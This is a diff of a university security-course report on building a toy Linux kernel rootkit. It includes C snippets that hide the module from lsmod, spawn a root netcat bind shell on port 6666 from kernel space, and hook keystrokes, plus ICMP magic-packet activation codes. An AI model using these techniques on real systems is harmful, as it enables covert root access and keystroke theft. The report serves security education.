@@ -32,12 +32,14 @@
 \usepackage{listings}
 \usepackage{amssymb}% http://ctan.org/pkg/amssymb
 \usepackage{pifont}% http://ctan.org/pkg/pifont
-\usepackage{ulem}
+%\usepackage{ulem}
 \usepackage[usenames,dvipsnames]{xcolor}
-\usepackage[breakable, theorems, skins]{tcolorbox}
+%\usepackage[breakable, theorems, skins]{tcolorbox}
 \usepackage{soul}
-\tcbset{enhanced}
+%\tcbset{enhanced}
 \newcommand*\xor{\mathbin{\oplus}}
+\newcommand{\shellcmd}[1]{\\\indent\indent\texttt{\footnotesize\ #1}\\}
+\newcommand{\shellcmdinline}[1]{\texttt{\footnotesize #1}}
 \definecolor{mygreen}{rgb}{0,0.6,0}
 \definecolor{mygray}{rgb}{0.5,0.5,0.5}
 \definecolor{mymauve}{rgb}{0.58,0,0.82}
@@ -50,7 +52,8 @@
   commentstyle=\color{mygreen},    % comment style
   escapeinside={\%*}{*)},          % if you want to add LaTeX within your code
   keywordstyle=\color{blue},       % keyword style
-  stringstyle=\color{mymauve},     % string literal style
+  stringstyle=\color{mymauve},      % string literal style
+  language=C
 }
 %\usepackage{times} % Uncomment to use the Times New Roman font
 
@@ -58,7 +61,7 @@
 %   DOCUMENT INFORMATION
 %----------------------------------------------------------------------------------------
 
-\title{\huge{Keylogger/Backdoor Rootkit} \\\large{Winter term 2015/16} \\\quad \\\huge{Applied Information Security}}
+\title{\huge{Keylogger/Backdoor Rootkit} \\\large{Winter Term 2015/16} \\\quad \\\huge{Applied Information Security}}
 
 
 \author{Clemens \textsc{Brunner}\\
@@ -79,27 +82,124 @@
 
 \section{Introduction}
 
-In the following we want to explore how to make a linux kernel rootkit. As the definition of a rootkit stats it should run as root and should be hard to detect for users. To give the rootkit real value it has to do something. We decided to go with two very common usecases when it comes to 
+This work aims at developing a toy Linux kernel rootkit with basic keylogging and backdoor capabilities. A \emph{rootkit} is usually a piece of malicious software designed to give an attacker some kind of privileged access (root) to a system while masking it's existence on the system. We choose two very basic but popular a privileged tasks for a rootkit to implement. The first creates a simple \emph{backdoor}, that means every attacker can span a shell, with root access, on demand and connect to it without any knowledge of user or root credentials. That means the attacker has full control over the infected machine. The second task we implemented is a keylogger that sends every keystroke to the attacker. Such a keylogger gives the attacker the possibility to steal passwords and account information and therefore the identity of the attacked user.  
+
+In the remaining part of this section we want to give a basic introduction into kernel modules and why we used them. In Section \ref{sec:impl} we talk about the actual implementation of the features in detail. Section \ref{sec:usage} sketches the usage in a brief fashion. After that, in Section \ref{sec:conc} we give a brief summary and conclusion. 
 
 
 \subsection{Kernel Modules}
 
-\subsection{Kernel Rootkits}
+Almost every modern operating system has some sort of kernel extension mechanism. Without such a mechanism everything that has to run in kernel mode has to be included into the kernel binary. This would not only be a massive wast of space, but would also require to rebuild the entire kernel every time we need new functionality. The aim of a kernel extension mechanism is to extend the kernel without rebuilding the kernel or even rebooting it. 
+
+Different operating systems have different names for such extensions as for example kernel-mode driver (Windows), kernel extension (OS X) or loadable kernel module (Linux). Because we develop a Linux rootkit we use the term kernel module in the following. 
+
+A kernel module in its simplest form is nothing more than a piece of code, usually written in the C programming language that can be loaded into kernel space at runtime. It has a setup and a exit function which are called if the module is loaded or unloaded. Listing \ref{simple} gives an example of a very simple kernel module. The only thing it does it logs "Hello world" to the system log on when loaded and "Goodby world" when unloaded.
+
+\begin{lstlisting}[caption=Source: \url{http://www.tldp.org/LDP/lkmpg/2.6/html/x121.html}., label=simple]
+
+/*  
+ *  hello-1.c - The simplest kernel module.
+ */
+#include <linux/module.h>	/* Needed by all modules */
+#include <linux/kernel.h>	/* Needed for KERN_INFO */
+
+int init_module(void)
+{
+	printk(KERN_INFO "Hello world 1.\n");
+
+	/* 
+	 * A non 0 return means init_module failed; module can't be loaded. 
+	 */
+	return 0;
+}
+
+void cleanup_module(void)
+{
+	printk(KERN_INFO "Goodbye world 1.\n");
+}
+
+\end{lstlisting}
+
+All code inside a kernel module is run in the context of the kernel and therefore can do anything possible on your computer, without any protection. That means even something as small as a single bad pointer could possibly wipe your hard drive. Another difference that has to be mentioned is that you don't use the usual C standard lib but code that is exported by the kernel itself. 
+
+In the implementation section we will use a kernel module to implement our rootkit.
 
 \section{Implementation}
+\label{sec:impl}
+
+\subsection{Hiding}
+As already mention in the introduction a rootkit should mask its existence as good as possible to prevent the detection of the possible malicious operations. Although a kernel module is not visible as a process on the system it can be easily revealed via the \shellcmdinline{lsmod} command, which lists all currently loaded kernel modules. To prevent our module from the most obvious way of detection we want to hide it from \shellcmdinline{lsmod}. 
+
+This sounds hard at first but it is rather easy. We can use the special exported symbol \texttt{extern struct module \_\_this\_module;} which points to the module we are currently in. The module structure, see Listing \ref{module}, has a field \texttt{list} that points to the list of all modules. 
+
+\begin{lstlisting}[caption=Extract from Linux/include/linux/module.h, label=module]
+
+
+struct module {
+         enum module_state state;
+ 
+         /* Member of list of modules */
+         struct list_head list;
+ 
+         /* Unique handle for this module */
+         char name[MODULE_NAME_LEN];
+
+         .
+         .
+         .
+
+         // skipped for brevity
+}
+ 
+\end{lstlisting}
+
+That means to hide the module from detection we only need to delete it from the list of modules and we are done. Luckily the kernel provides us with handy list manipulation functions. Finally our effort boils down to one line of code as you can see in Listing \ref{hide}.
+
+\begin{lstlisting}[caption=Hide the current module., label=hide]
+	list_del(&(__this_module.list));
+\end{lstlisting}
+
+
+
+\subsection{Backdoor}
+The dream of every attacker is a backdoor into every system he is interested in. As we have already compromised the system in our scenario and have gained root access (installation of the rootkit) the task of spawning a backdoor to gain access to the system any time we want is rather easy. What we also wanted to achieve is that the backdoor is not active all the time but can be activated whenever needed. Again magic packets, as described in \ref{sec:magicpackage} are used to activate the backdoor. The backdoor itself is achieved by simply spawning a \shellcmdinline{netcat -l -p 6666 -e /bin/sh} process in userland. This is done via the \shellcmdinline{call\_usermodehelper} function. Listing \ref{backdoof} shows the spawning function.
+
+\begin{lstlisting}[caption=Span netcat in userland., label=backdoor]
+void shell_tasklet_fn(unsigned long data){
+		static char *envp[] = {
+	        "HOME=/",
+	        "TERM=linux",
+	        "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
+	char *argv3[] = {"/bin/sh", "-c", "/bin/netcat -l -p 6666 -e /bin/sh &", NULL};
+	call_usermodehelper(argv3[0], argv3, envp, UMH_NO_WAIT);
+
+}
+\end{lstlisting}
+
+The hard part was not the creation of the process itself but doing it inside of an interrupt handler (reception of magic packet). Many functions can not be called safely (long running functions and so on) inside the context of an interrupt. Because of that we used the tasklet API to defer the execution of \shellcmdinline{call\_usermodehelper} to a save point in time into the kernel context. Listing \ref{tasklet} shows the usage of the tasklet API to start the \shellcmdinline{shell\_tasklet\_fn} in a deferred and safe manner.
+
+ \begin{lstlisting}[caption=Tasklet API., label=tasklet]
+DECLARE_TASKLET(shell_tasklet, shell_tasklet_fn, 0);
+
+void start_remote_shell(void){
+	tasklet_schedule( &shell_tasklet );
+}
+ \end{lstlisting}
+
+
+
+
 \subsection{Keylogging}
-This section deals about keylogging in linux kernel. Keylogging describes the process of intercepting all inputkeys from a keyboard. Our rootkit intercepts all keys and sends them to a server. It is possible to activate and deactivate the keylogging function with a magic package, see \ref{sec:magicpackage}. 
+This section deals with keylogging in the linux kernel. Keylogging describes the process of intercepting all inputkeys from a keyboard. Our rootkit intercepts all keys and sends them to a server. It is possible to activate and deactivate the keylogging function with a magic package, see \ref{sec:magicpackage}. 
 To implement a keylogger in the linux kernel you must register a keyboard notifier.
 
 \begin{lstlisting}
 	register_keyboard_notifier(&keyboard_notifier);
 \end{lstlisting}
 
-The keyboard notifier stores the \lstinline{keyboard_hook} method which will be called on each key press. This function gets a keyboard keycode as input, to filter out the associated character we use two arrays with the mapping for the american keyboard layout. The first one is the mapping without \lstinline{SHIFT} and the secound is with \lstinline{SHIFT} pressed.
+The keyboard notifier stores the \lstinline{keyboard_hook} method which will be called on each key press. This function gets a keyboard keycode as input, to filter out the associated character we use two arrays with the mapping for the American keyboard layout. The first one is the mapping without \lstinline{SHIFT} and the second is with \lstinline{SHIFT} pressed.
 
 
-\subsection{Backdoor}
-\subsection{Hiding}
 
 \subsection{Networking and Activation}
 \label{sec:magicpackage}
@@ -109,7 +209,7 @@ To communicate with the rootkit two methods are used.
 	\item UDP Sockets
 \end{itemize}
 \subsubsection{ICMP Packages}
-To activate the keylogger, hide the rootkit modul or open a backdoor shell with root access magic packages are used. We used a normal ping package where the \lstinline{code} is the same as the \lstinline{id}. The following values are used for code and id to assign the descriped functionality.
+To activate the keylogger, hide the rootkit module or open a backdoor shell with root access magic packages are used. We used a normal ping package where the \lstinline{code} is the same as the \lstinline{id}. The following values are used for code and id to assign the descried functionality.
 \begin{itemize}
 	\item[122:] \lstinline{KEYLOGGER_ACTIVATION_CODE}
 	\item[123:] \lstinline{KEYLOGGER_DEACTIVATION_CODE}
@@ -128,7 +228,26 @@ The netfilter hook catches all icmp packages for the evaluation only packages th
 \subsubsection{UPD Sockets}
 For sending the keys to the client and for controlling the server with the backdoor shell, UPD datagram packages are used.
 
+\section{Usage}
+\label{sec:usage}
+This section describes how to setup the rootkit and how to use the client application.
+
+\subsection{Rootkit}
+The rootkit can be build via \shellcmdinline{make}. To install it execute \shellcmdinline{insmod rootkit.ko} as root user.
+
+\subsection{Client}
+The to start one of the possible operation on our infected system use \shellcmd{rootkit\_client.py~-[a,d]~<feature-key>~-h~<host>} Three different features can be controlled via the feature-keys \emph{key} (keylogger), \emph{hide} (hide the kernel module) and \emph{root} (backdoor/root access). To activate a feature use the option \shellcmdinline{-a} and \shellcmdinline{-d} to deactivate a feature. The root feature is the only feature that has no deactivation because it can be easily be done via the shell itself. The root feature only starts the backdoor on a certain host. To connect to it use the usual suspects e.g. \shellcmdinline\shellcmdinline{nc <host> 6666}.
+
+
 \section{Conclusion}
+
+With some basic knowledge of the linux kernel, Google and some time it is possible to develop a simple rootkit for linux. Backdoor and keylogging is also rather trivial if you don't spend to much effort handling error situations or edge cases. The same goes for hiding. But if you want a bullet proof solution that works in every situation, on every machine and does not reveal itself you gonna have a hard time. 
+
+\label{sec:conc}
+\subsection{Possible Improvements}
+As in every project there is room for improvements for example:
+
+We only prevent the rootkit detection via \shellcmdinline{lsmod} and equivalent commands but there are other methods to detect rootkits e.g. network activity, changes in the system call table and so on. The implementation of the backdoor should be improved. It needs a specific version of \shellcmdinline{netcat} (-e option) to be installed. The invocation of the userland \shellcmdinline{netcat} process from the kernel is not very reliable and needs to be revisited. And the worst part is that the new netcat process is visible to every user and needs to be hidden.  
 
 \end{document}
 
